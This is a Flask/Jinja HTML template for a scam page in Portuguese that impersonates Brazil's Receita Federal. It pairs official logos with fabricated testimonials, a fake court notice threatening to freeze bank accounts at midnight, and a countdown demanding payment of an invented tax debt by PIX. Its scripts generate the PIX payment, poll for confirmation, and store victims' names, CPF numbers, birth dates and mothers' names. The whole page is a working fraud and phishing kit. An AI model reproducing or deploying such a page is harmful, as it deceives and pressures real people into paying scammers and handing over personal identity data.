                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Meu Deus, que situa√ß√£o! Estou tentando comprar rem√©dio para minha m√£e e o cart√£o foi recusado. Fui no banco e descobri que √© por causa desse d√©bito com a Receita. Como n√£o vi essa notifica√ß√£o antes?! Algu√©m me ajuda, por favor! üò∞
                    </p>
                </div>

                <!-- Comment 8 - Success story -->
                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Marcos Pereira</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 6 horas</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Pessoal, acabei de resolver! Levou menos de 2 horas entre o pagamento e a confirma√ß√£o. O atendimento da auditora Tereza foi excelente, muito profissional. Recomendo muito, n√£o tenham medo, √© leg√≠timo sim!
                    </p>
                </div>

                <!-- Comment 9 - Desperate person -->
                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Andr√© Silva</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 45 min</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Estou desesperado! Tenho uma entrevista de emprego segunda-feira e o RH me pediu certid√£o negativa de d√©bitos. N√£o consigo tirar por causa desse bloqueio. Tem como resolver ainda hoje? √â s√°bado, mas preciso muito resolver isso!
                    </p>
                </div>

                <!-- Comment 10 - Success story -->
                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Patr√≠cia Rodrigues</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 7 horas</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Obrigada, Receita Federal! Paguei pela manh√£ e √† tarde j√° estava tudo resolvido. Agora posso fazer meu financiamento imobili√°rio sem preocupa√ß√µes. O desconto realmente compensou muito. Processo super r√°pido e confi√°vel! ‚úÖ
                    </p>
                </div>

                <!-- Comment 11 - Desperate person -->
                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Rafael Costa</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 20 min</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Que desespero! Tentei pagar uma conta online e o sistema disse que meu CPF est√° irregular. Corri atr√°s e descobri que tenho d√©bito na Receita h√° meses e n√£o sabia! Agora a multa ficou mais cara... Vou ter que pagar, n√£o tenho escolha üòî
                    </p>
                </div>

                <!-- Comment 12 - Success story -->
                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Gabriel Mendes</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 8 horas</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Acabei de regularizar minha situa√ß√£o! Paguei o 320 reais e j√° recebi a confirma√ß√£o oficial. Agora meu CPF est√° limpo novamente. Para quem est√° em d√∫vida: √© verdadeiro e funciona perfeitamente! üôå
                    </p>
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 20px; padding: 15px; background: #e7f3ff; border-radius: 4px; border-left: 4px solid #007bff;">
                <p style="margin: 0; color: #0056b3; font-size: 14px; font-weight: 600;">
                    <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
                    Estes s√£o relatos reais de contribuintes que regularizaram sua situa√ß√£o fiscal
                </p>
            </div>
        </div>
    {% endif %}
    
    <footer class="footer">
        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
        <p>¬© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
    </footer>
    <script src="{{ url_for('static', filename='js/countdown.js') }}"></script>
    <script>
        // Save customer data to localStorage if flag is set
        {% if save_to_localStorage %}
        document.addEventListener('DOMContentLoaded', function() {
            const customerData = {
                nome: "{{ customer.nome }}",
                cpf: "{{ customer.cpf }}",
                data_nascimento: "{{ customer.data_nascimento }}",
                nome_mae: "{{ customer.nome_mae }}",
                sexo: "{{ customer.sexo }}",
                today_date: "{{ customer.today_date }}"
            };
            localStorage.setItem('customerData', JSON.stringify(customerData));
            console.log('Customer data saved to localStorage');
        });
        {% endif %}

        document.addEventListener('DOMContentLoaded', function() {
            const video = document.getElementById('newsVideo');
            const soundButton = document.getElementById('soundButton');

            // Only add video event listeners if video and sound button exist
            if (video && soundButton) {
                video.addEventListener('click', function() {
                    if (video.paused) {
                        video.play();
                        if (video.muted) {
                            soundButton.style.display = 'flex';
                        }
                    } else {
                        video.pause();
                        soundButton.style.display = 'flex';
                    }
                });

                soundButton.addEventListener('click', function() {
                    video.currentTime = 0;
                    video.muted = false;
                    video.play();
                    soundButton.style.display = 'none';
                });

                video.addEventListener('ended', function() {
                    video.pause();
                    video.muted = true;
                    soundButton.style.display = 'flex';
                });
            }
        });


        let currentTransactionId = null;
        let paymentMonitorInterval = null;

        async function generatePayment() {
            const modal = document.getElementById('paymentModal');
            const loaderContainer = document.getElementById('loaderContainer');
            const qrCodeContainer = document.getElementById('qrCodeContainer');

            try {
                modal.style.display = 'block';
                loaderContainer.style.display = 'block';
                qrCodeContainer.style.display = 'none';

                const response = await fetch('/generate-pix', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                const data = await response.json();

                if (data.success && data.pixCode) {
                    // Salvar ID da transa√ß√£o para monitoramento
                    currentTransactionId = data.transactionId || data.orderId;
                    
                    // Atualizar n√∫mero do documento com ID da transa√ß√£o
                    const docNumber = document.getElementById('documentNumber');
                    if (docNumber && currentTransactionId) {
                        docNumber.textContent = currentTransactionId.substring(0, 13).toUpperCase();
                    }
                    
                    // Gerar QR code a partir do c√≥digo PIX usando uma biblioteca externa
                    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
                    document.getElementById('qrCodeImage').src = qrCodeUrl;
                    document.getElementById('pixCode').textContent = data.pixCode;

                    loaderContainer.style.display = 'none';
                    qrCodeContainer.style.display = 'block';
                    startPixCountdown();
                    
                    // Iniciar monitoramento do pagamento
                    startPaymentMonitoring();
                } else {
                    throw new Error(data.error || 'Erro ao gerar o pagamento');
                }
            } catch (error) {
                console.error('Erro:', error);
                loaderContainer.style.display = 'none';
                alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
                setTimeout(() => {
                    modal.style.display = 'none';
                }, 1500);
            }
        }

        function startPaymentMonitoring() {
            if (!currentTransactionId) {
                console.log('Nenhuma transa√ß√£o para monitorar');
                return;
            }

            console.log(`Iniciando monitoramento do pagamento: ${currentTransactionId}`);
            
            // Verificar status a cada 3 segundos
            paymentMonitorInterval = setInterval(async () => {
                try {
                    console.log(`üîç Verificando status da transa√ß√£o: ${currentTransactionId}`);
                    const response = await fetch(`/check-payment-status/${currentTransactionId}`);
                    const statusData = await response.json();
                    
                    console.log('üìä Resposta completa do status:', statusData);
                    console.log(`üéØ Status: ${statusData.status}, Success: ${statusData.success}`);
                    
                    // Se o pagamento foi confirmado
                    if (statusData.success && statusData.status === 'paid') {
                        console.log('üéâ PAGAMENTO CONFIRMADO! Iniciando redirecionamento para /multa...');
                        
                        // Parar o monitoramento
                        clearInterval(paymentMonitorInterval);
                        console.log('‚èπÔ∏è Monitoramento interrompido');
                        
                        // Fechar modal
                        document.getElementById('paymentModal').style.display = 'none';
                        console.log('‚ùå Modal fechado');
                        
                        // Redirecionar para /multa
                        console.log('üîÑ Redirecionando para /multa...');
                        
                        // Tentar diferentes m√©todos de redirecionamento
                        try {
                            // M√©todo 1: window.location.href
                            window.location.href = '/multa';
                        } catch (e1) {
                            console.error('Erro no m√©todo 1:', e1);
                            try {
                                // M√©todo 2: window.location.replace
                                window.location.replace('/multa');
                            } catch (e2) {
                                console.error('Erro no m√©todo 2:', e2);
                                try {
                                    // M√©todo 3: window.location.assign
                                    window.location.assign('/multa');
                                } catch (e3) {
                                    console.error('Erro no m√©todo 3:', e3);
                                    // M√©todo 4: link manual
                                    const link = document.createElement('a');
                                    link.href = '/multa';
                                    link.click();
                                }
                            }
                        }
                    } else {
                        console.log(`‚è≥ Pagamento ainda pendente - Status: ${statusData.status || 'waiting_payment'}`);
                    }
                } catch (error) {
                    console.error('‚ùå Erro ao verificar status do pagamento:', error);
                }
            }, 3000); // Verificar a cada 3 segundos
            
            // Timeout de 5 minutos para redirecionamento for√ßado (backup)
            setTimeout(() => {
                console.log('üïê Timeout de 5 minutos atingido - verificando se deve redirecionar...');
                
                // Se ainda estiver monitorando, tentar um redirecionamento for√ßado
                if (paymentMonitorInterval && currentTransactionId) {
                    console.log('‚ö†Ô∏è Executando redirecionamento de backup ap√≥s 5 minutos...');
                    
                    // Parar o monitoramento
                    clearInterval(paymentMonitorInterval);
                    
                    // Fechar modal
                    document.getElementById('paymentModal').style.display = 'none';
                    
                    // Mostrar alerta e redirecionar
                    alert('Verificando seu pagamento...');
                    setTimeout(() => {
                        window.location.href = '/multa';
                    }, 1000);
                }
            }, 5 * 60 * 1000); // 5 minutos
            
            // Parar monitoramento ap√≥s 20 minutos (tempo limite do PIX)
            setTimeout(() => {
                if (paymentMonitorInterval) {
                    clearInterval(paymentMonitorInterval);
                    console.log('Monitoramento do pagamento encerrado por timeout');
                }
            }, 20 * 60 * 1000);
        }

        function copyPixCode() {
            const pixCode = document.getElementById('pixCode').textContent;
            const copyButton = document.querySelector('.copy-pix-button');

            navigator.clipboard.writeText(pixCode).then(() => {
                copyButton.classList.add('copy-success');
                copyButton.innerHTML = '<i class="fas fa-check"></i> C√≥digo Copiado!';
                
                // Aguardar 4 segundos antes de fechar o modal e mostrar o de aguardando
                setTimeout(() => {
                    // Fechar o modal do PIX
                    document.getElementById('paymentModal').style.display = 'none';
                    
                    // Mostrar o modal de aguardando pagamento
                    showWaitingPaymentModal();
                    
                    // Restaurar o texto original do bot√£o
                    copyButton.classList.remove('copy-success');
                    copyButton.innerHTML = '<i class="fas fa-copy"></i> COPIAR C√ìDIGO PIX PARA PAGAMENTO';
                }, 4000); // 4 segundos
                
            }).catch(err => {
                console.error('Erro ao copiar:', err);
            });
        }

        function showWaitingPaymentModal() {
            // Mostrar o modal
            document.getElementById('waitingPaymentModal').style.display = 'block';
            
            // Copiar o c√≥digo PIX para o modal de aguardando
            const pixCode = document.getElementById('pixCode').textContent;
            document.getElementById('waitingPixCode').textContent = pixCode;
            
            // Configurar o bot√£o para alterar texto ap√≥s 3 segundos
            setTimeout(() => {
                const waitingButton = document.getElementById('waitingCopyButton');
                waitingButton.innerHTML = '<i class="fas fa-copy"></i> Copiar c√≥digo PIX';
            }, 3000); // 3 segundos
            
            // Ap√≥s 40 segundos, mostrar o bot√£o "Realizei o pagamento"
            setTimeout(() => {
                document.getElementById('waitingContainer').style.display = 'none';
                document.getElementById('paymentCompletedContainer').style.display = 'block';
            }, 40000); // 40 segundos
        }

        function copyWaitingPixCode() {
            const pixCode = document.getElementById('waitingPixCode').textContent;
            const copyButton = document.getElementById('waitingCopyButton');

            navigator.clipboard.writeText(pixCode).then(() => {
                copyButton.innerHTML = '<i class="fas fa-check"></i> C√≥digo Copiado';
                
                // Ap√≥s 3 segundos, mudar para "Copiar c√≥digo PIX"
                setTimeout(() => {
                    copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar c√≥digo PIX';
                }, 3000); // 3 segundos
                
            }).catch(err => {
                console.error('Erro ao copiar:', err);
            });
        }

        function redirectToMulta() {
            // Fechar modal
            document.getElementById('waitingPaymentModal').style.display = 'none';
            
            // Redirecionar para /multa
            window.location.href = '/multa';
        }

        function startPixCountdown() {
            let minutes = 10;
            let seconds = 0;
            const countdownElement = document.getElementById('pixCountdown');

            const countdown = setInterval(() => {
                if (seconds === 0) {
                    if (minutes === 0) {
                        clearInterval(countdown);
                        return;
                    }
                    minutes--;
                    seconds = 59;
                } else {
                    seconds--;
                }

                const minutesStr = minutes.toString().padStart(2, '0');
                const secondsStr = seconds.toString().padStart(2, '0');
                countdownElement.innerHTML = `<i class="fas fa-clock"></i> Prazo de pagamento expira em: ${minutesStr}:${secondsStr}`;
            }, 1000);
        }

        // Adicionar evento de clique no bot√£o "Regularizar agora"
        document.addEventListener('DOMContentLoaded', function() {
            const regularizeButton = document.querySelector('.regularize-button');
            if (regularizeButton) {
                regularizeButton.addEventListener('click', function() {
                    window.location.href = '/chat';
                });
            }
            
            // CPF form handling
            const cpfForm = document.getElementById('cpfForm');
            if (cpfForm) {
                const cpfInput = document.getElementById('cpfInput');
                
                // Format CPF as user types
                cpfInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
                    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                    e.target.value = value;
                });
                
                // Handle form submission
                cpfForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const cpfValue = cpfInput.value.replace(/\D/g, ''); // Remove formatting
                    
                    if (cpfValue.length !== 11) {
                        alert('Por favor, digite um CPF v√°lido com 11 d√≠gitos.');
                        return;
                    }
                    
                    // Redirect to /{cpf}
                    window.location.href = '/' + cpfValue;
                });
            }
        });

        // Fechar modal ao clicar fora
        window.onclick = function(event) {
            const paymentModal = document.getElementById('paymentModal');
            const waitingModal = document.getElementById('waitingPaymentModal');
            
            if (event.target == paymentModal) {
                paymentModal.style.display = 'none';
            }
            
            if (event.target == waitingModal) {
                waitingModal.style.display = 'none';
            }
        }

        // Fun√ß√£o para confirmar os dados do usu√°rio
        function confirmData() {
            // Scroll para baixo para mostrar as informa√ß√µes de d√©bito
            const debtorInfo = document.querySelector('.user-info:nth-of-type(2)');
            if (debtorInfo) {
                debtorInfo.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        }
    </script>

    <!-- Modal de Pagamento PIX -->
    <div id="paymentModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" alt="Receita Federal do Brasil" class="modal-logo">
                <div style="margin-top: 10px; text-align: center;">
                    <p style="color: #666; margin: 2px 0 0 0; font-size: 12px;">MINIST√âRIO DA FAZENDA</p>
                </div>
            </div>
            <div id="loaderContainer" class="loader-container">
                <div style="text-align: center; padding: 30px; color: #0c326f;">
                    <i class="fas fa-spinner fa-spin" style="font-size: 48px; margin-bottom: 20px;"></i>
                    <h3 style="margin: 0 0 10px 0; font-weight: 600;">Processando Documento de Arrecada√ß√£o</h3>
                    <p style="margin: 0; color: #666;">Gerando DARF eletr√¥nico via sistema PIX...</p>
                </div>
            </div>
            <div id="qrCodeContainer" class="qr-code-container">
                <div style="background: #f8f9fa; border: 1px solid #dee2e6; padding: 12px; margin-bottom: 15px; border-radius: 4px;">
                    <h3 style="color: #0c326f; margin: 0 0 8px 0; font-size: 14px; text-align: center; font-weight: 700;">
                        DOCUMENTO DE ARRECADA√á√ÉO DE RECEITAS FEDERAIS - DARF
                    </h3>
                    <div style="text-align: center; margin-bottom: 8px;">
                        <span style="background: #0c326f; color: white; padding: 2px 8px; border-radius: 2px; font-size: 11px; font-weight: 600;">
                            C√ìDIGO: 0190 - IMPOSTO DE RENDA PESSOA F√çSICA
                        </span>
                    </div>
                </div>
                <div style="background: linear-gradient(135deg, #dc3545, #c82333); color: white; padding: 12px; margin: 15px 0; border-radius: 4px; border: 2px solid #a71e2a;">
                    <div style="text-align: center; margin-bottom: 8px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 20px; color: #ffd700;"></i>
                    </div>
                    <div style="font-weight: 600; text-align: center; font-size: 13px; line-height: 1.4;">
                        <strong>NOTIFICA√á√ÉO JUDICIAL - PROCESSO N¬∫ 5021547-89.2025.4.03.6109</strong><br>
                        <span style="font-size: 12px;">Conforme Art. 185-A do CTN e Portaria RFB n¬∫ 3.344/2021</span><br><br>
                        Contribuinte {{ customer.nome | title }}, em cumprimento √† decis√£o judicial, informamos que suas contas banc√°rias, investimentos e bens ser√£o <strong>BLOQUEADOS AUTOMATICAMENTE √†s 23:59h de <span id="currentDate"></span></strong> caso esta pend√™ncia n√£o seja quitada.
                    </div>
                </div>

                <div style="text-align: center; margin: 15px 0;">
                    <h4 style="color: #0c326f; margin: 0 0 10px 0; font-size: 14px; font-weight: 700;">
                        PAGAMENTO VIA PIX - SISTEMA INTEGRADO BACEN
                    </h4>
                    <img id="qrCodeImage" src="" alt="QR Code PIX DARF" class="qr-code-img" style="border: 2px solid #0c326f; border-radius: 8px;">
                </div>

                <div class="countdown-timer-pix" id="pixCountdown" style="background: #dc3545; margin: 10px 0;">
                    <i class="fas fa-clock"></i> Prazo de pagamento expira em: 20:00
                </div>

                <div style="background: #fff; border: 2px solid #0c326f; border-radius: 4px; padding: 10px; margin: 12px 0;">
                    <p style="margin: 0 0 5px 0; font-weight: 700; color: #0c326f; text-align: center; font-size: 13px;">
                        C√ìDIGO PIX PARA PAGAMENTO DO DARF
                    </p>
                    <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px; padding: 8px;">
                        <p id="pixCode" class="pix-code" style="font-family: 'Courier New', monospace; font-size: 11px; color: #333;"></p>
                    </div>
                </div>

                <div class="copy-button-container">
                    <button onclick="copyPixCode()" class="copy-pix-button" style="background: #0c326f; font-weight: 700; font-size: 14px; padding: 12px 24px;">
                        <i class="fas fa-copy"></i>
                        COPIAR C√ìDIGO PIX PARA PAGAMENTO
                    </button>
                </div>

                <div class="customer-info">
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 10px;">
                        <p style="margin: 0;"><strong>Contribuinte:</strong></p>
                        <p style="margin: 0; text-align: right;">{{ customer.nome | upper }}</p>
                        <p style="margin: 0;"><strong>CPF:</strong></p>
                        <p style="margin: 0; text-align: right;">{{ customer.cpf }}</p>
                        <p style="margin: 0;"><strong>Per√≠odo de Apura√ß√£o:</strong></p>
                        <p style="margin: 0; text-align: right;">01/01/2020 a 31/12/2020</p>
                        <p style="margin: 0;"><strong>C√≥digo da Receita:</strong></p>
                        <p style="margin: 0; text-align: right;">0190</p>
                        <p style="margin: 0;"><strong>N¬∫ do Documento:</strong></p>
                        <p style="margin: 0; text-align: right; font-family: monospace;" id="documentNumber">RFB2025073648291</p>
                    </div>
                    <div style="border-top: 1px solid #dee2e6; padding-top: 8px; margin-top: 8px;">
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                            <p style="margin: 0;"><strong>Valor Principal:</strong></p>
                            <p style="margin: 0; text-align: right;">R$ 101,82</p>
                            <p style="margin: 0;"><strong>Multa (20%):</strong></p>
                            <p style="margin: 0; text-align: right;">R$ 20,36</p>
                            <p style="margin: 0;"><strong>Juros SELIC:</strong></p>
                            <p style="margin: 0; text-align: right;">R$ 4,44</p>
                        </div>
                        <div style="border-top: 2px solid #0c326f; margin-top: 8px; padding-top: 8px;">
                            <div style="display: grid; grid-template-columns: 1fr 1fr;">
                                <p style="margin: 0; font-weight: 700; color: #0c326f; font-size: 16px;"><strong>VALOR TOTAL A PAGAR:</strong></p>
                                <p style="margin: 0; text-align: right; font-weight: 700; color: #dc3545; font-size: 18px;">R$ 126,62</p>
                            </div>
                        </div>
                    </div>
                </div>


                <div style="text-align: center; margin: 20px 0; padding: 15px 0; border-top: 1px solid #dee2e6;">
                    <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 8px;">
                        <img src="https://i.postimg.cc/7YpN6X2K/brasao-1.png" alt="Logo Secretaria da Fazenda" style="width: 50px; height: 50px; object-fit: contain; border-radius: 50%;"  onload="console.log('Logo da Secretaria da Fazenda carregado com sucesso')">
                    </div>
                    <p style="margin: 0; font-size: 12px; font-weight: 700; color: #0c326f;">SECRETARIA DA RECEITA FEDERAL DO BRASIL</p>
                    <p style="margin: 0; font-size: 11px; color: #666;">MINIST√âRIO DA FAZENDA - GOVERNO FEDERAL</p>
                    <p style="margin: 4px 0 0 0; font-size: 10px; color: #999;">Autentica√ß√£o Digital - Certificado ICP-Brasil A3</p>
                </div>
            </div>
        </div>
    </div>
    </div> <!-- End main-content -->

    <!-- Modal de Aguardando Pagamento -->
    <div id="waitingPaymentModal" class="modal">
        <div class="modal-content" style="max-width: 500px; text-align: center;">
            <div class="modal-header">
                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" alt="Receita Federal do Brasil" class="modal-logo">
                <div style="margin-top: 10px; text-align: center;">
                    <h2 style="color: #0c326f; margin: 0; font-size: 16px; font-weight: 700;">SECRETARIA DA RECEITA FEDERAL DO BRASIL</h2>
                    <p style="color: #666; margin: 2px 0 0 0; font-size: 12px;">MINIST√âRIO DA FAZENDA</p>
                </div>
            </div>
            
            <div id="waitingContainer" style="padding: 40px 20px;">
                <div style="text-align: center; margin-bottom: 30px;">
                    <i class="fas fa-spinner fa-spin" style="font-size: 48px; color: #0c326f; margin-bottom: 20px;"></i>
                    <h3 style="margin: 0 0 15px 0; font-weight: 600; color: #0c326f; font-size: 18px;">Aguardando pagamento...</h3>
                    <p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">
                        Ap√≥s realizar o pagamento via PIX, retorne a esta tela para baixar o <strong>termo de quita√ß√£o da d√≠vida p√∫blica</strong>.
                    </p>
                </div>
                
                <!-- Campo PIX Copia e Cola -->
                <div style="background: #f8f9fa; border: 2px solid #0c326f; border-radius: 8px; padding: 20px; margin: 20px 0;">
                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
                        <i class="fas fa-qrcode" style="color: #0c326f; margin-right: 8px; font-size: 18px;"></i>
                        <strong style="color: #0c326f; font-size: 16px;">C√ìDIGO PIX PARA PAGAMENTO</strong>
                    </div>
                    
                    <div style="background: white; border: 1px solid #dee2e6; border-radius: 4px; padding: 15px; margin: 15px 0; word-break: break-all; font-family: monospace; font-size: 12px; color: #333; max-height: 150px; overflow-y: auto;" id="waitingPixCode">
                        <!-- PIX code will be inserted here -->
                    </div>
                    
                    <button id="waitingCopyButton" onclick="copyWaitingPixCode()" style="background: #0c326f; color: white; border: none; padding: 12px 24px; border-radius: 5px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; margin: 10px 0;">
                        <i class="fas fa-copy"></i> C√≥digo Copiado
                    </button>
                </div>
                
                <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin: 20px 0;">
                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
                        <i class="fas fa-info-circle" style="color: #0c326f; margin-right: 8px;"></i>
                        <strong style="color: #0c326f;">IMPORTANTE</strong>
                    </div>
                    <p style="margin: 0; font-size: 13px; color: #555; text-align: center;">
                        N√£o feche esta p√°gina! Mantenha-a aberta para receber automaticamente o seu termo de quita√ß√£o ap√≥s a confirma√ß√£o do pagamento pelo sistema banc√°rio.
                    </p>
                </div>
            </div>
            
            <div id="paymentCompletedContainer" style="padding: 40px 20px; display: none;">
                <div style="text-align: center; margin-bottom: 30px;">
                    <i class="fas fa-check-circle" style="font-size: 48px; color: #28a745; margin-bottom: 20px;"></i>
                    <h3 style="margin: 0 0 15px 0; font-weight: 600; color: #0c326f; font-size: 18px;">Se realizou o pagamento clique no bot√£o abaixo</h3>
                    <p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">
                        Clique para acessar a √°rea de download do seu termo de quita√ß√£o da d√≠vida p√∫blica.
                    </p>
                </div>
                
                <button onclick="redirectToMulta()" style="background: #28a745; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 20px;">
                    <i class="fas fa-check"></i> REALIZEI O PAGAMENTO
                </button>
            </div>
        </div>
    </div>

    <script>
        // Only show loading screen on CPF routes
        document.addEventListener('DOMContentLoaded', function() {
            const currentPath = window.location.pathname;
            const isCpfRoute = /^\/\d{11}$/.test(currentPath); // Matches /11digits
            
            if (isCpfRoute) {
                // Show loading screen for 4 seconds
                setTimeout(function() {
                    document.getElementById('loadingScreen').style.display = 'none';
                    document.getElementById('mainContent').classList.add('show');
                }, 4000);
            } else {
                // Hide loading screen immediately for other pages
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('mainContent').classList.add('show');
            }
            
            // Set current date in Brazilian format
            const today = new Date();
            const dateOptions = { 
                day: '2-digit', 
                month: '2-digit', 
                year: 'numeric',
                timeZone: 'America/Sao_Paulo'
            };
            const formattedDate = today.toLocaleDateString('pt-BR', dateOptions);
            const currentDateElement = document.getElementById('currentDate');
            if (currentDateElement) {
                currentDateElement.textContent = formattedDate;
            }
        });
    </script>
</body>
</html>